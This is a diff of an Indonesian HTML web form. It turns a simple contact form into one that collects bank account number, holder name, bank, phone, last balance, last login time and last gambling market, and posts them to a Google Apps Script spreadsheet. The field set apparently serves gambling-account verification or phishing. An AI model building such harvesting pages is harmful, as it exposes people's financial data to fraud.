@@ -1,484 +1,355 @@
-
+```html
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="theme-color" content="#ffffff">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Formulir Data</title>
 
-  <title>Formulir Online</title>
+<style>
+*{box-sizing:border-box}
 
-  <style>
-    :root {
-      --gold: #d4af37;
-      --gold-dark: #a98216;
-      --gold-light: #f8edc5;
-      --black: #171717;
-      --text: #333333;
-      --muted: #777777;
-      --white: #ffffff;
-      --border: #e8e1cf;
-      --success: #18794e;
-      --danger: #c62828;
-    }
+body{
+  margin:0;
+  min-height:100vh;
+  padding:30px 15px;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  font-family:Arial,sans-serif;
+  color:#171717;
+  background:linear-gradient(135deg,#fffdf7,#ffffff,#fff9e8);
+}
 
-    * {
-      box-sizing: border-box;
-    }
+.container{
+  width:100%;
+  max-width:520px;
+  padding:28px;
+  border:1.5px solid #d4af37;
+  border-radius:20px;
+  background:#fff;
+  box-shadow:0 10px 35px #b89a3020;
+  position:relative;
+  overflow:hidden;
+}
 
-    html {
-      scroll-behavior: smooth;
-    }
+.container:before{
+  content:"";
+  position:absolute;
+  top:0;
+  left:0;
+  width:100%;
+  height:4px;
+  background:linear-gradient(90deg,#a98216,#f8e7a0,#d4af37);
+}
 
-    body {
-      margin: 0;
-      min-height: 100vh;
-      padding: 36px 16px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: Arial, Helvetica, sans-serif;
-      color: var(--black);
-      background:
-        radial-gradient(
-          circle at 10% 0%,
-          #fff9e8 0,
-          transparent 34%
-        ),
-        radial-gradient(
-          circle at 100% 100%,
-          #fff8e7 0,
-          transparent 30%
-        ),
-        #ffffff;
-    }
+.logo{
+  width:55px;
+  height:55px;
+  display:grid;
+  place-items:center;
+  border:1px solid #d4af37;
+  border-radius:15px;
+  background:#fff9e8;
+  color:#a98216;
+  font-size:27px;
+  margin-bottom:18px;
+}
 
-    .container {
-      width: 100%;
-      max-width: 470px;
-      padding: 30px;
-      border: 1.5px solid var(--gold);
-      border-radius: 22px;
-      background: #ffffff;
-      box-shadow:
-        0 8px 30px rgba(160, 125, 30, 0.08),
-        0 2px 8px rgba(0, 0, 0, 0.025);
-      position: relative;
-      overflow: hidden;
-    }
+h1{
+  margin:0 0 10px;
+  font-size:26px;
+  color:#111;
+}
 
-    .container::before {
-      content: "";
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 4px;
-      background: linear-gradient(
-        90deg,
-        #b78b19,
-        #f8e7a0,
-        #d4af37,
-        #fff0b3,
-        #b78b19
-      );
-    }
+.subtitle{
+  color:#666;
+  font-size:14px;
+  line-height:1.6;
+  margin-bottom:22px;
+}
 
-    .logo {
-      width: 60px;
-      height: 60px;
-      display: grid;
-      place-items: center;
-      margin-bottom: 20px;
-      border: 1.5px solid var(--gold);
-      border-radius: 17px;
-      background: linear-gradient(
-        145deg,
-        #fffdf6,
-        #fff4ce
-      );
-      color: var(--gold-dark);
-      font-size: 30px;
-      box-shadow: 0 4px 14px rgba(212, 175, 55, 0.12);
-    }
+.form-card{
+  margin-bottom:14px;
+  padding:14px;
+  border:1px solid #d4af37;
+  border-radius:13px;
+  background:#fff;
+  transition:.2s;
+}
 
-    h1 {
-      margin: 0 0 10px;
-      color: #111111;
-      font-size: 28px;
-      line-height: 1.25;
-      font-weight: 800;
-      letter-spacing: -0.6px;
-    }
+.form-card:focus-within{
+  box-shadow:0 0 0 3px #d4af3720;
+  border-color:#a98216;
+}
 
-    .subtitle {
-      margin: 0 0 25px;
-      color: #666666;
-      line-height: 1.7;
-      font-size: 14px;
-    }
+label{
+  display:block;
+  margin-bottom:9px;
+  font-size:13px;
+  font-weight:bold;
+  color:#222;
+}
 
-    .form-card {
-      padding: 18px;
-      margin-top: 16px;
-      border: 1px solid var(--gold);
-      border-radius: 15px;
-      background: #ffffff;
-      box-shadow: 0 3px 12px rgba(180, 145, 35, 0.045);
-      transition:
-        box-shadow 0.2s ease,
-        border-color 0.2s ease;
-    }
+input,textarea,select{
+  display:block;
+  width:100%;
+  padding:12px;
+  border:1px solid #dedede;
+  border-radius:9px;
+  background:#fff;
+  color:#171717;
+  font-family:Arial,sans-serif;
+  font-size:14px;
+  outline:none;
+}
 
-    .form-card:focus-within {
-      border-color: var(--gold-dark);
-      box-shadow: 0 0 0 3px rgba(212, 175, 55, 0.12);
-    }
+input:focus,textarea:focus,select:focus{
+  border-color:#d4af37;
+}
 
-    label {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      margin: 0 0 10px;
-      color: #202020;
-      font-size: 13px;
-      font-weight: 700;
-    }
+input::placeholder,textarea::placeholder{
+  color:#999;
+}
 
-    .label-icon {
-      display: inline-grid;
-      place-items: center;
-      width: 25px;
-      height: 25px;
-      border: 1px solid #ead79a;
-      border-radius: 7px;
-      background: #fff9e8;
-      color: #987313;
-      font-size: 13px;
-    }
+textarea{
+  min-height:90px;
+  resize:vertical;
+}
 
-    input,
-    textarea {
-      display: block;
-      width: 100%;
-      padding: 13px 14px;
-      border: 1px solid #dedede;
-      border-radius: 10px;
-      outline: none;
-      background: #ffffff;
-      color: #171717;
-      font-family: inherit;
-      font-size: 14px;
-      line-height: 1.5;
-      transition:
-        border-color 0.2s ease,
-        box-shadow 0.2s ease;
-    }
+button{
+  width:100%;
+  margin-top:8px;
+  padding:15px;
+  border:1px solid #bd941f;
+  border-radius:11px;
+  background:linear-gradient(110deg,#e8ce72,#d4af37,#c69a20);
+  color:#171717;
+  font-size:14px;
+  font-weight:bold;
+  letter-spacing:.5px;
+  cursor:pointer;
+  transition:.2s;
+}
 
-    input::placeholder,
-    textarea::placeholder {
-      color: #a0a0a0;
-    }
+button:hover:not(:disabled){
+  filter:brightness(1.04);
+  transform:translateY(-1px);
+}
 
-    input:focus,
-    textarea:focus {
-      border-color: var(--gold);
-      box-shadow: 0 0 0 3px rgba(212, 175, 55, 0.12);
-    }
+button:disabled{
+  opacity:.6;
+  cursor:wait;
+}
 
-    textarea {
-      min-height: 115px;
-      resize: vertical;
-    }
+#status{
+  display:none;
+  margin-top:15px;
+  padding:13px;
+  border-radius:10px;
+  font-size:13px;
+  line-height:1.6;
+  overflow-wrap:anywhere;
+}
 
-    .submit-btn {
-      width: 100%;
-      min-height: 49px;
-      margin-top: 22px;
-      padding: 14px 18px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      border: 1px solid #bd941f;
-      border-radius: 12px;
-      background: linear-gradient(
-        110deg,
-        #e4c45b,
-        #d4af37 48%,
-        #c69a20
-      );
-      color: #171717;
-      font-size: 14px;
-      font-weight: 800;
-      letter-spacing: 0.7px;
-      cursor: pointer;
-      box-shadow: 0 5px 14px rgba(190, 151, 34, 0.18);
-      transition:
-        transform 0.2s ease,
-        box-shadow 0.2s ease,
-        filter 0.2s ease;
-    }
+#status.info{
+  display:block;
+  color:#755c12;
+  background:#fffbec;
+  border:1px solid #e4d29a;
+}
 
-    .submit-btn:hover:not(:disabled) {
-      transform: translateY(-2px);
-      filter: brightness(1.04);
-      box-shadow: 0 8px 20px rgba(190, 151, 34, 0.24);
-    }
+#status.success{
+  display:block;
+  color:#18794e;
+  background:#effaf3;
+  border:1px solid #a8d8bd;
+}
 
-    .submit-btn:active:not(:disabled) {
-      transform: translateY(0);
-    }
+#status.error{
+  display:block;
+  color:#b42318;
+  background:#fff2f2;
+  border:1px solid #efb4b4;
+}
 
-    .submit-btn:disabled {
-      opacity: 0.65;
-      cursor: wait;
-      transform: none;
-    }
+.note{
+  margin-top:20px;
+  padding:13px;
+  border:1px solid #ead79a;
+  border-radius:11px;
+  background:#fffdf6;
+  text-align:center;
+  font-size:12px;
+  line-height:1.7;
+  color:#76643a;
+}
 
-    #status {
-      display: none;
-      margin-top: 17px;
-      padding: 14px;
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      font-size: 13px;
-      line-height: 1.7;
-      overflow-wrap: anywhere;
-      white-space: pre-wrap;
-    }
-
-    #status.info {
-      display: block;
-      border-color: #e4d29a;
-      background: #fffbec;
-      color: #755c12;
-    }
-
-    #status.success {
-      display: block;
-      border-color: #a8d8bd;
-      background: #effaf3;
-      color: var(--success);
-    }
-
-    #status.error {
-      display: block;
-      border-color: #efb4b4;
-      background: #fff2f2;
-      color: var(--danger);
-    }
-
-    .note-card {
-      margin-top: 22px;
-      padding: 13px 15px;
-      border: 1px solid #e8d69e;
-      border-radius: 12px;
-      background: #fffdf6;
-      text-align: center;
-      color: #6e6344;
-      font-size: 12px;
-      line-height: 1.7;
-    }
-
-    .note-card strong {
-      color: #8c6c13;
-    }
-
-    .footer {
-      margin-top: 20px;
-      text-align: center;
-      color: #999999;
-      font-size: 11px;
-      letter-spacing: 0.3px;
-    }
-
-    @media (max-width: 480px) {
-      body {
-        padding: 18px 12px;
-        align-items: flex-start;
-      }
-
-      .container {
-        padding: 23px 18px;
-        border-radius: 18px;
-      }
-
-      h1 {
-        font-size: 25px;
-      }
-
-      .form-card {
-        padding: 15px;
-      }
-    }
-
-    @media (prefers-reduced-motion: reduce) {
-      *,
-      *::before,
-      *::after {
-        scroll-behavior: auto !important;
-        transition: none !important;
-      }
-    }
-  </style>
+@media(max-width:480px){
+  body{padding:15px 10px;align-items:flex-start}
+  .container{padding:22px 16px}
+  h1{font-size:24px}
+}
+</style>
 </head>
 
 <body>
-  <main class="container">
-    <div class="logo" aria-hidden="true">✦</div>
+<main class="container">
 
-    <h1>Formulir Online</h1>
+  <div class="logo">✦</div>
 
-    <p class="subtitle">
-      Silakan isi informasi berikut dengan benar.
-      Periksa kembali data Anda sebelum menekan tombol kirim.
-    </p>
+  <h1>Formulir Data</h1>
 
-    <form id="dataForm">
-      <div class="form-card">
-        <label for="username">
-          <span class="label-icon" aria-hidden="true">♙</span>
-          Username
-        </label>
+  <p class="subtitle">
+    Silakan isi seluruh informasi pada formulir berikut
+    sesuai data yang benar.
+  </p>
 
-        <input
-          id="username"
-          name="username"
-          type="text"
-          placeholder="Masukkan username"
-          autocomplete="username"
-          required
-          maxlength="100"
-        >
-      </div>
+  <form id="dataForm">
 
-      <div class="form-card">
-        <label for="email">
-          <span class="label-icon" aria-hidden="true">✉</span>
-          Email
-        </label>
-
-        <input
-          id="email"
-          name="email"
-          type="email"
-          placeholder="nama@email.com"
-          autocomplete="email"
-          required
-          maxlength="200"
-        >
-      </div>
-
-      <div class="form-card">
-        <label for="pesan">
-          <span class="label-icon" aria-hidden="true">✎</span>
-          Pesan
-        </label>
-
-        <textarea
-          id="pesan"
-          name="pesan"
-          placeholder="Tulis pesan Anda di sini..."
-          required
-          maxlength="3000"
-        ></textarea>
-      </div>
-
-      <button id="submitBtn" class="submit-btn" type="submit">
-        <span>KIRIM DATA</span>
-        <span aria-hidden="true">→</span>
-      </button>
-
-      <div id="status" role="status" aria-live="polite"></div>
-    </form>
-
-    <div class="note-card">
-      <strong>✦ INFORMASI</strong><br>
-      Formulir ini menggunakan Google Apps Script
-      untuk mengirimkan data ke Google Sheets.
+    <div class="form-card">
+      <label for="username">Username</label>
+      <input id="username" name="username"
+        type="text" placeholder="Masukkan username"
+        maxlength="100" required>
     </div>
 
-    <div class="footer">
-      FORMULIR ONLINE &bull; SIMPLE &bull; CLEAN &bull; ELEGANT
+    <div class="form-card">
+      <label for="nomor_rekening">Nomor rekening</label>
+      <input id="nomor_rekening" name="nomor_rekening"
+        type="text" inputmode="numeric"
+        placeholder="Masukkan nomor rekening"
+        maxlength="100" required>
     </div>
-  </main>
 
-  <script>
-    const SCRIPT_URL =
-      "https://script.google.com/macros/s/AKfycbzw3lnr27WH0v3PIlgqr8isWbqq1ITl4HIHg0W3RjJYBM_b1gynHlfBu2qhbC7tAUW1gg/exec";
+    <div class="form-card">
+      <label for="nama_rekening">Nama rekening</label>
+      <input id="nama_rekening" name="nama_rekening"
+        type="text" placeholder="Masukkan nama pemilik rekening"
+        maxlength="150" required>
+    </div>
 
-    const form = document.getElementById("dataForm");
-    const button = document.getElementById("submitBtn");
-    const statusBox = document.getElementById("status");
+    <div class="form-card">
+      <label for="nama_bank">Nama bank</label>
+      <input id="nama_bank" name="nama_bank"
+        type="text" placeholder="Masukkan nama bank"
+        maxlength="100" required>
+    </div>
 
-    function showStatus(message, type) {
-      statusBox.className = type;
-      statusBox.textContent = message;
-    }
+    <div class="form-card">
+      <label for="email">Email</label>
+      <input id="email" name="email"
+        type="email" placeholder="nama@email.com"
+        maxlength="200" required>
+    </div>
 
-    form.addEventListener("submit", async function(event) {
-      event.preventDefault();
+    <div class="form-card">
+      <label for="no_hp">No. HP</label>
+      <input id="no_hp" name="no_hp"
+        type="tel" inputmode="tel"
+        placeholder="Masukkan nomor HP"
+        maxlength="30" required>
+    </div>
 
-      if (!SCRIPT_URL.startsWith("https://script.google.com/")) {
-        showStatus(
-          "URL Google Apps Script tidak valid. Periksa konfigurasi URL.",
-          "error"
-        );
-        return;
-      }
+    <div class="form-card">
+      <label for="saldo_terakhir">Saldo terakhir</label>
+      <input id="saldo_terakhir" name="saldo_terakhir"
+        type="text" placeholder="Masukkan saldo terakhir"
+        maxlength="100" required>
+    </div>
 
-      const data = {
-        username: document.getElementById("username").value.trim(),
-        email: document.getElementById("email").value.trim(),
-        pesan: document.getElementById("pesan").value.trim()
-      };
+    <div class="form-card">
+      <label for="terakhir_login">Terakhir login</label>
+      <input id="terakhir_login" name="terakhir_login"
+        type="text" placeholder="Contoh: 19/10/2026, 08:30"
+        maxlength="150" required>
+    </div>
 
-      if (!data.username || !data.email || !data.pesan) {
-        showStatus("Mohon isi semua kolom terlebih dahulu.", "error");
-        return;
-      }
+    <div class="form-card">
+      <label for="terakhir_bet">Terakhir bet di pasaran apa</label>
+      <input id="terakhir_bet" name="terakhir_bet"
+        type="text" placeholder="Masukkan nama pasaran"
+        maxlength="200" required>
+    </div>
 
-      button.disabled = true;
-      button.innerHTML = "<span>MENGIRIM DATA...</span><span>⌛</span>";
+    <button id="submitBtn" type="submit">
+      KIRIM DATA →
+    </button>
 
-      showStatus(
-        "Sedang mengirim permintaan ke Google Apps Script. Mohon tunggu...",
-        "info"
-      );
+    <div id="status" role="status" aria-live="polite"></div>
 
-      try {
-        const body = new URLSearchParams();
-        body.append("payload", JSON.stringify(data));
+  </form>
 
-        await fetch(SCRIPT_URL, {
-          method: "POST",
-          mode: "no-cors",
-          body: body
-        });
+  <div class="note">
+    <strong>INFORMASI</strong><br>
+    Periksa kembali data sebelum dikirim.
+  </div>
 
-        showStatus(
-          "Permintaan pengiriman telah diteruskan oleh browser. " +
-          "Namun, browser tidak dapat memastikan apakah data berhasil " +
-          "disimpan karena menggunakan mode no-cors. " +
-          "Silakan periksa Google Sheets sebelum mencoba mengirim ulang.",
-          "info"
-        );
+</main>
 
-        // Tidak mereset formulir agar data tetap tersedia
-        // jika penyimpanan di Google Sheets belum terkonfirmasi.
+<script>
+const SCRIPT_URL =
+"https://script.google.com/macros/s/AKfycbzw3lnr27WH0v3PIlgqr8isWbqq1ITl4HIHg0W3RjJYBM_b1gynHlfBu2qhbC7tAUW1gg/exec";
 
-      } catch (error) {
-        showStatus(
-          "Pengiriman gagal dimulai. Periksa koneksi internet, " +
-          "URL Web App, dan konfigurasi Google Apps Script, lalu coba lagi.",
-          "error"
-        );
-      } finally {
-        button.disabled = false;
-        button.innerHTML = "<span>KIRIM DATA</span><span>→</span>";
-      }
+const form = document.getElementById("dataForm");
+const button = document.getElementById("submitBtn");
+const statusBox = document.getElementById("status");
+
+function showStatus(message,type){
+  statusBox.className = type;
+  statusBox.textContent = message;
+}
+
+form.addEventListener("submit",async function(event){
+  event.preventDefault();
+
+  const data = {
+    username: document.getElementById("username").value.trim(),
+    nomor_rekening: document.getElementById("nomor_rekening").value.trim(),
+    nama_rekening: document.getElementById("nama_rekening").value.trim(),
+    nama_bank: document.getElementById("nama_bank").value.trim(),
+    email: document.getElementById("email").value.trim(),
+    no_hp: document.getElementById("no_hp").value.trim(),
+    saldo_terakhir: document.getElementById("saldo_terakhir").value.trim(),
+    terakhir_login: document.getElementById("terakhir_login").value.trim(),
+    terakhir_bet: document.getElementById("terakhir_bet").value.trim()
+  };
+
+  if(!Object.values(data).every(Boolean)){
+    showStatus("Mohon isi semua kolom terlebih dahulu.","error");
+    return;
+  }
+
+  button.disabled = true;
+  button.textContent = "MENGIRIM DATA...";
+
+  showStatus("Sedang mengirim permintaan...","info");
+
+  try{
+    const body = new URLSearchParams();
+    body.append("payload",JSON.stringify(data));
+
+    await fetch(SCRIPT_URL,{
+      method:"POST",
+      mode:"no-cors",
+      body:body
     });
-  </script>
+
+    showStatus(
+      "Permintaan sudah diteruskan. Periksa Google Sheets untuk memastikan data benar-benar tersimpan sebelum mengirim ulang.",
+      "info"
+    );
+  }catch(error){
+    showStatus(
+      "Pengiriman gagal dimulai. Periksa koneksi internet dan URL Apps Script.",
+      "error"
+    );
+  }finally{
+    button.disabled = false;
+    button.textContent = "KIRIM DATA →";
+  }
+});
+</script>
 </body>
 </html>
+```
